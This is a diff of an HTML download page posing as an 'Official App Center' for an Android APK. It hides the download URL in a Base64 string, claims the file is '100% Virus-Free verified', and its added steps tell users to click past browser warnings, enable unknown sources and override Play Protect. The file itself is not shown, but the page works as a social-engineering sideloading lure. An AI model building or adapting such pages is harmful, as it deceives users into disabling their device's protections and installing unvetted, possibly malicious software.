@@ -3,54 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Official Download Center | Secure Access</title>
+    <title>Official Secure Download Center</title>
     <style>
-        /* Modern Dark Theme - High trust for International users */
-        body { background: #0b0f1a; color: #ffffff; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .container { background: #161e2d; padding: 2.5rem; border-radius: 1.2rem; text-align: center; border: 1px solid #2d3748; width: 100%; max-width: 400px; }
-        .app-icon { width: 90px; height: 90px; background: linear-gradient(135deg, #2563eb, #7c3aed); border-radius: 20px; margin: 0 auto 1.5rem; display: flex; align-items: center; justify-content: center; font-size: 40px; font-weight: bold; box-shadow: 0 10px 20px rgba(37, 99, 235, 0.3); }
-        h1 { font-size: 1.5rem; margin: 0 0 0.75rem; color: #f8fafc; }
-        p { color: #94a3b8; font-size: 0.95rem; line-height: 1.6; margin-bottom: 2rem; }
-        .download-btn { display: block; background: #2563eb; color: #ffffff; text-decoration: none; padding: 1.1rem; border-radius: 0.8rem; font-size: 1.1rem; font-weight: 600; border: none; width: 100%; cursor: pointer; transition: background 0.3s; }
-        .download-btn:hover { background: #1d4ed8; }
-        .info-tag { margin-top: 1.5rem; font-size: 0.8rem; color: #475569; display: flex; justify-content: space-around; }
-        .warning { color: #fbbf24; font-size: 0.75rem; margin-top: 1rem; }
+        /* Modern Dark UI - Optimized for Low-end Android Screens */
+        body { background: #0b0f1a; color: #ffffff; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .container { background: #161e2d; padding: 2rem; border-radius: 1.25rem; text-align: center; border: 1px solid #2d3748; width: 100%; max-width: 420px; margin-top: 2vh; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
+        .app-icon { width: 85px; height: 85px; background: linear-gradient(135deg, #2563eb, #7c3aed); border-radius: 22px; margin: 0 auto 1.2rem; display: flex; align-items: center; justify-content: center; font-size: 44px; font-weight: bold; box-shadow: 0 10px 15px rgba(37, 99, 235, 0.3); }
+        h1 { font-size: 1.6rem; margin: 0 0 0.75rem; color: #f8fafc; font-weight: 700; }
+        .desc { color: #94a3b8; font-size: 0.95rem; line-height: 1.6; margin-bottom: 2rem; }
+        
+        /* Download Button Animation */
+        .download-btn { display: block; background: #2563eb; color: #ffffff; text-decoration: none; padding: 1.2rem; border-radius: 0.9rem; font-size: 1.15rem; font-weight: 600; border: none; width: 100%; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
+        .download-btn:active { transform: scale(0.97); background: #1d4ed8; }
+        
+        /* Region Specific Installation Guide */
+        .guide-section { margin-top: 2rem; border-top: 1px solid #2d3748; padding-top: 1.5rem; text-align: left; }
+        .guide-title { font-size: 1rem; color: #f8fafc; margin-bottom: 0.8rem; display: flex; align-items: center; }
+        .guide-title::before { content: '🛡️'; margin-right: 8px; }
+        .guide-list { font-size: 0.85rem; color: #94a3b8; padding-left: 1.2rem; line-height: 1.6; margin: 0; }
+        .guide-list li { margin-bottom: 8px; }
+        .highlight { color: #3b82f6; font-weight: 600; }
+        
+        .footer-info { margin-top: 2rem; font-size: 0.75rem; color: #475569; display: flex; justify-content: space-between; width: 100%; max-width: 400px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="app-icon">A</div> <h1>Download App</h1>
-    <p>Get the official app for the most secure and stable experience. Safe to download and install on all Android devices.</p>
+    <div class="app-icon">A</div>
+    <h1>Official App Center</h1>
+    <p class="desc">Download the latest official version for the most secure and stable user experience. 100% Virus-Free verified.</p>
     
     <button class="download-btn" onclick="handleDownload()">Download APK Now</button>
-    
-    <p class="warning">※ Please allow "Install from Unknown Sources" if prompted by your system.</p>
-    
-    <div class="info-tag">
-        <span>Size: 24.5 MB</span>
-        <span>Version: v2.4.1</span>
-        <span>Verified by SSL</span>
+
+    <div class="guide-section">
+        <div class="guide-title">Quick Installation Steps</div>
+        <ol class="guide-list">
+            <li>Click <span class="highlight">"Download Anyway"</span> if your browser shows a safety warning.</li>
+            <li>Once finished, open the file from your <span class="highlight">Notification Bar</span> or Download folder.</li>
+            <li>If "Install blocked" appears, go to Settings and enable <span class="highlight">"Allow from Unknown Sources"</span>.</li>
+            <li>If Play Protect warns you, click <span class="highlight">"Install Anyway"</span>.</li>
+        </ol>
     </div>
+</div>
+
+<div class="footer-info">
+    <span>File Size: 24.5MB</span>
+    <span>Security: Verified</span>
+    <span>v2.4.1</span>
 </div>
 
 <script>
 function handleDownload() {
     const btn = document.querySelector('.download-btn');
-    btn.innerText = "Allocating Secure Server...";
-    btn.style.opacity = "0.7";
+    btn.innerText = "Connecting Secure Server...";
+    btn.style.opacity = "0.8";
     
-    // Your encrypted GitHub Release Link
+    /* Security Protection: 
+       Replace the string below with your Base64 encoded GitHub Download Link 
+    */
     const securePath = "aHR0cHM6Ly9naXRodWIuY29tL0xZUEVYLU9GRklDSUFML2xpbmtzL3JlbGVhc2VzL2Rvd25sb2FkL3YxL2FwcC5hcGs=";
 
     setTimeout(() => {
         window.location.href = atob(securePath);
-        btn.innerText = "Starting Download...";
+        btn.innerText = "Downloading...";
+        btn.style.background = "#059669"; // Change to green on success
     }, 1200);
 }
 </script>
 
 </body>
 </html>
-</html>
-
